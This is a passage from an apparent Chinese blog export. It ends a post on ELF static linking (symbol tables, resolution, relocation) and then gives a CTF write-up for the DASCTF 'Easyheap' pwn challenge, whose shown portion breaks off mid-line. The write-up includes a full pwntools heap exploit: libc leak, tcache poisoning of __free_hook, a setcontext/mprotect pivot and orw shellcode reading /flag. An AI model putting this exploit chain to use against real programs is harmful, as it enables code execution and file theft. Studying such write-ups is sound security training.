alt="SHT"></p><p>SHT每项包含</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>sh_name</td><td>Section name：这里存放的是其name字符在字符串表的偏移</td></tr><tr><td>sh_type</td><td>Section type：表示该段的类型，例如.text是程序段</td></tr><tr><td>sh_flag</td><td>Section flag：表示该段的标志位</td></tr><tr><td>sh_addr</td><td>Section Address：段虚拟地址</td></tr><tr><td>sh_offset</td><td>Section Offset：段偏移 表示该段在文件中的偏移</td></tr><tr><td>sh_size</td><td>Section Size：该段长度</td></tr><tr><td>sh_link</td><td>Section Link：链接有关段专属,段链接信息</td></tr><tr><td>sh_info</td><td>Section information：同上</td></tr><tr><td>sh_addralign</td><td>Section Address Alignment：段地址对齐方式</td></tr><tr><td>sh_entsize</td><td>Section Entry Size：如果该段有一些固定大小项，这里展示每项的大小</td></tr></tbody></table><p>有了这个SHT我们就可以找到任何一个想要找到的section在哪里了。这里链接器就可以知道所有段的位置和长度。而仅仅找到每个段的位置是不足以让来链接器完成链接的工作的，我们不能单单是把相似的section合并了事。</p><p>在runtime阶段，我们要调用一个变量或者函数是需要知道该函数或者是变量的位置的，这里就需要</p><p>对符号进行分析。这里也需要一个表来寻找不同的符号，去对符号进行解析。</p><h2 id="symbol-Table"><a href="#symbol-Table" class="headerlink" title="symbol Table"></a>symbol Table</h2><p>如果我们要定位到每个符号在ELF中的位置，这就需要一个section来表述这些符号，也就是<strong>.symtab</strong>(<strong>符号表</strong>)。我们知道C语言不难在函数的内部再次定义函数，所以一个ELF文件平分为两层：函数的内部、函数外部。<strong>外部的</strong>函数和变量是对链接可见的，所以它们可以被其他的ELF文件所引用，也就是符号。</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>st_name</td><td>st_name 保存了指向符号表中字符串表（位于.dynstr 或者.strtab） 的偏移地址，偏移地址存放着符号的名称，如 printf。</td></tr><tr><td>st_value</td><td>st_value 存放符号的值（可能是地址或者位置偏移量）。</td></tr><tr><td>st_size</td><td>st_size 存放了一个符号的大小，如全局函数指针的大小，在一个 32 位 系统中通常是 4 字节。</td></tr><tr><td>st_other</td><td>st_other 变量定义了符号的可见性。</td></tr><tr><td>st_shndx</td><td>每个符号表条目的定义都与某些节对应。st_shndx 变量保存了相关节头表的索引。</td></tr><tr><td>st_info</td><td>st_info 指定符号类型及绑定属性。</td></tr></tbody></table><h3 id="st-info"><a href="#st-info" class="headerlink" title="st_info"></a>st_info</h3><p>st_info分为两个部分<strong>Symbol Type</strong>和<strong>Symbol Binding</strong>。</p><p><em><strong>Bind：</strong></em></p><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>本地符号在目标文件之外是不可见的，目标文件包含 了符号的定义，如一个声明为 static 的函数。</td></tr><tr><td>STB_GLOBAL</td><td>1</td><td>全局符号对于所有要合并的目标文件来说都是可见 的。一个全局符号在一个文件中进行定义后，另外一个文件可以对这 个符号进行引用。</td></tr><tr><td>STB_WEAK</td><td>2</td><td>与全局绑定类似，不过比 STB_GLOBAL 的优先级低。 被标记为 STB_WEAK 的符号有可能会被同名的未被标记为 STB_WEAK 的符号覆盖。</td></tr></tbody></table><p><em><strong>Type：</strong></em></p><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE</td><td>0</td><td>符号类型未定义。</td></tr><tr><td>STT_OBJECT</td><td>1</td><td>该符号是一个数据对象，比如变量、数组等</td></tr><tr><td>STT_FUNC</td><td>2</td><td>表示该符号与函数或者其他可执行代码关联。</td></tr><tr><td>STT_SECTION</td><td>3</td><td>该符号表示一个段，这种符号必须是STB_LOCAL的</td></tr><tr><td>STT_FILE</td><td>4</td><td>该符号表示文件名，一般是该目标文件对应的源文件名，它一定是STB_LOCAL类型的，并且它的st_shndx一定是SHN_ABS</td></tr></tbody></table><h3 id="st-shndx"><a href="#st-shndx" class="headerlink" title="st_shndx"></a>st_shndx</h3><table><thead><tr><th>宏定义</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>0xfff1</td><td>表示该符号包含一个绝对的值，比如文件名的符号</td></tr><tr><td>SHN_COMMON</td><td>0xfff2</td><td>表示该符号是一个“common块”类型的符号，一般未初始化的全局符号就是这种类型的。</td></tr><tr><td>SHN_UNDEF</td><td>0</td><td>表示该符号未定义。这个符号表示该服符号在目标文件被引用，但定义在其他目标文件中</td></tr></tbody></table><p>以上就是除了重定位段以外关于静态链接的的核心section。重定位我们在后面讨论静态链接的过程中再讨论。</p><h1 id="静态链接过程"><a href="#静态链接过程" class="headerlink" title="静态链接过程"></a>静态链接过程</h1><h2 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h2><p> 静态链接的第一步需要符号解析，在ELF文件被读入内存后，不同的文件可能有相同的符号名。符号解析需要解决这种冲突，需要在所有的ELF中选择一个作为该符号的定义，当然对于局部符号而言是不需要考虑不同文件件的冲突问题的。</p><p>对于全局符号而言其有四种状态</p><table><thead><tr><th>状态</th><th>说明</th></tr></thead><tbody><tr><td>Defined(有定义)</td><td>该符号在ELF文件中有确切的位置来储存其数值</td></tr><tr><td>Tentative(临时定义)</td><td>该符号没有确定的储存空间，也就是在SHN_COMMON中的全局变量，在编译阶段无法确定其最最终归属</td></tr><tr><td>Undefined(未定义)</td><td>该符号没有储存空间，也就是其属于SHN_UNDEF段</td></tr><tr><td>Weak Bind(弱定义)</td><td>该符号属于弱定义，也就是其bind为STB_WEAK</td></tr></tbody></table><p>这些符号的优先级为<strong>Undefined &lt; Weak Bind &lt; Tentative &lt; Defined</strong></p><p>全局符号只能存在一个，当出现重复的全局符号时只能选择一个作为目标文件的符号，这里的四种符号，<strong>强符号只有Defined</strong>这一种，其余三项都是弱符号</p><p>而选择符号有以下条规则：</p><ul><li>当存在强符号，且只有这一个强符号时，选择该强符号</li><li>当同时存在多个强符号时，链接器无法处理，报错</li><li>当没有强符号存在时，按照优先级选择一个弱符号</li></ul><p>大多数情况下可以通过这个规则选择出需要的符号，但若在最后一种情况下出现type和size的区分有时候链接器也会无法做出决定。</p><p>经过这一步链接器就将不同的ELF文件中的符号全部处理完成了</p><h2 id="Section-merge"><a href="#Section-merge" class="headerlink" title="Section merge"></a>Section merge</h2><p>当我们的符号解析完成后，接下来就是对相同类型的section进行合并。通过被解析的符号，将相同section的符号放在同一section，这样我们就确定了每个符号在EOF文件中的大小和起始位置，建立起一个映射关系。合并起来的section被称作Segment。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210810182800665.png" alt="Section合并"></p><h2 id="引用重定位"><a href="#引用重定位" class="headerlink" title="引用重定位"></a>引用重定位</h2><p>完成符号解析和section合并后基本EOF文件成型，但是函数或者变量之间的调用位置还没有写入，这时就需要对所有的符号进行重定位。</p><p>我们先来看看重定位表的结构</p><h3 id="Relocation-Table"><a href="#Relocation-Table" class="headerlink" title="Relocation Table"></a>Relocation Table</h3><p>对于可以重定位的ELF文件来说，它必须有重定位表。对于每个要被重定位的ELF段都有一个对应的重定位表。对应.text有<strong>.rel.text</strong>，对于.data有<strong>.rel.data</strong>。每个要被重定位的地方叫做重定位入口。</p><p>重定位入口结构为：</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>r_offset</td><td>重定位入口的偏移，这个值表示该重定位入口所要修正的位置的第一个字节相对于段的偏移</td></tr><tr><td>r_info</td><td>重定位入口的类型和符号，一部分表示重定位入口的类型，一部分是重定位入口在符号表的下标</td></tr></tbody></table><p>链接器知道了以上两个成员就知道了在哪里进行重定位，又重定位到哪里去。</p><p>而重定位的类型则对应着多种多样的寻址模式，而重定位的基本类型分为相对寻址和绝对寻址。</p><h3 id="两种指令修正方式"><a href="#两种指令修正方式" class="headerlink" title="两种指令修正方式"></a>两种指令修正方式</h3><p>我们先设：</p><p><strong>A = 保存在被修正位置的值</strong></p><p><strong>P = 被修正的位置，可以通过r_offset得到</strong></p><p><strong>S = 符号的实际地址，这个可以通过r_info得到</strong></p><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>对与相对寻址而言，我们先通过重定位表的r_offset找到了<em><strong>P</strong></em>，也就是我们要修改的位置。</p><p>然后通过r_info找到对应要引用符号的的符号表，也就找到了<em><strong>S</strong></em>，符号的相对位置。</p><p>仅仅这样是不够的我们还要考虑rip指针在引用时的位置，这由指令本身决定，在被要被修改的地方保存着这值<em><strong>A</strong></em>。</p><p>那么相对寻址要修改为<em><strong>S-P+A</strong></em>。这样我们就实现了相对寻址。</p><h4 id="绝对寻址"><a href="#绝对寻址" class="headerlink" title="绝对寻址"></a>绝对寻址</h4><p>绝对寻址就不用考虑二者的偏移，只需要考虑S和A即可，既写入的是S+A。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这些就是静态链接的一些基本的框架了，了解了这些也就基本了解了链接的大致过程。学习这一块翻了好多书，也看了些视频，我会列在下面的参考资料里，有不明白的地方供大家参考。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>哔哩哔里up主<em><strong>yaaangmin</strong></em>的视频：深入理解计算机系统合集(<a href="https://www.bilibili.com/video/BV17K4y1N7Q2">https://www.bilibili.com/video/BV17K4y1N7Q2</a>)</p><p>以及其编写的文档：<a href="https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3">https://github.com/yangminz/bcst_csapp/releases/tag/chapter_1_2_3</a> </p><p><em><strong>《深入了解计算机系统(csapp)》</strong></em></p><p><em><strong>《程序员的自我修养——链接、装载与库》</strong></em></p><p><em><strong>《linux二进制分析》</strong></em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Base </category>
          
          <category> link </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Base </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF July X CBCTF 4th pwn</title>
      <link href="/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/"/>
      <url>/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写了一半的ret2dl的博客还没写完，本来准备边写边学。后面发现涉及的东西有些多，所以还是准备彻底理解了再接着写。最近打了安恒的比赛，这里记录和复现一下这场比赛的pwn。</p><h1 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>我们先分析一下题目，开始看到main函数开始有一些做初始化的函数，可以看到题目开了沙盒，我们来查看一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731105902768.png" alt="ida里发现的沙盒"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo seccomp-tools dump ./Easyheap </span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731110022532.png" alt="查看开了什么沙盒"></p><p>可以看到我们是不可以执行execve的，那么就只能使用orw来读取我们的flag了</p><p>我们接着分析几个函数</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151445458.png" alt="add"></p><p>发现add这里存在漏洞，<strong>strdup只会根据你输入的长度来确定malloc的大小和nbytes无关，heap_size的大小只和我们输入的大小nbytes有关，而heap_addr指向的堆是由strdup申请来的，其大小和我们输入的字符串长度有关。</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151843085.png" alt="show"></p><p>show函数没有什么特殊的，先查看heap里是否有</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152046694.png" alt="delete"></p><p>delete也一样没有什么特殊的，清空了指针</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152303249.png" alt="edit"></p><p>edit这里有add函数伏笔回收，如果我们在add时<strong>输入的长度大于我们输入字符串长度</strong>，这里我们就可以<strong>overwrite</strong></p><h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>要想泄露libc的地址我们需要先将chunk放入unsortedbin，题目的libc版本是<em>Ubuntu GLIBC 2.27-3ubuntu1.4</em>所以我们需要先<strong>填满tcache</strong>，然后提前申请好两个chunk，将后面的chunk放入unsorted_bin,通过上面heap的overwrite，来查看libc相对偏移。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804181622718.png" alt="填满tcache"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182003314.png" alt="overwrite"></p><p>得到我们的libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182401716.png" alt="泄露libc"></p><p>将我们可能需要的偏移全部计算出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br></pre></td></tr></table></figure><p>恢复之前overwrite的chunk，否侧无法从中申请到后面的chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182814206.png" alt="修复chunk"></p><p>我们知道了libc之后现在就可以去<strong>劫持hook</strong>了，我们将之前释放的chunk切割一块出来，再将其放入tcache。接下来再次<strong>通过overwrite来劫持free_hook</strong>，这样free_hook就被放在tcache的链表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook </span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804192601094.png" alt="free_hook被放入tcache"></p><p>成功劫持free_hook之后，由于这里开了沙盒所以需要我们做<strong>orw</strong>，首先我们需要一块可以调用写shellocde的地方，所以需要<strong>调用mprotect函数</strong>，在free_hook这一页添加可执行权限，而做到这个需要采用<strong>setcontent</strong>，我们将free_hook，改写为setcontent，这样我们调用free函数就会调用setcontent。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x1000</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804194358784.png" alt="free_hook周围值"></p><p>我们再将我们接下来要free的chunk内填上我们需要的值：</p><p>将rsp赋值为我们之前布置好的free_hook+0x18，其指向shellcode，这样setcontent执行完就会跳转到我们的shellcode</p><p>其他的rdi，rsi，rdx，rip，都是为了改写free_hook对应页的权限。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804195139417.png" alt="image-20210804195139417"></p><p>接下来当setcontent执行完，指针会跳转到我们free_hook附近写下的shellcode中，<strong>shellcode会调用read函数</strong>，会在我们free_hook页让我们写入shellocode并跳转执行。我们写入一个标准的orw即可。这一部分比较模板化，可以记录下来，以后稍加改造就可以再次使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sl(io,asm(shellcode2))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./Easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./Easyheap&#x27;)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">fake_size,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(fake_size))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">    libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    pause()</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook 1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">    shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">    frame.rdi = new_addr</span><br><span class="line">    frame.rsi = <span class="number">0x1000</span></span><br><span class="line">    frame.rdx = <span class="number">7</span></span><br><span class="line">    frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">    mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">    xor rdx, rdx ;</span></span><br><span class="line"><span class="string">    mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span 